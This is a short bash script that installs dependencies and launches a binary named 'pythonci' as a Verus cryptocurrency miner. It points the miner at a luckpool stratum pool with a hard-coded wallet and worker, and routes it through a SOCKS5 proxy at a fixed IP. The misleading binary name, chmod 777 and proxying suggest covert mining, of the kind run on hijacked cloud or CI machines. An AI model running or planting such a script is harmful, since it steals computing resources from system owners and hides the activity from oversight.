#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x humma.sh && chmod +x pythonci chmod 777 pythonci humma.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WR=VIA-119
PY=socks5://139.162.225.94:25849
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY

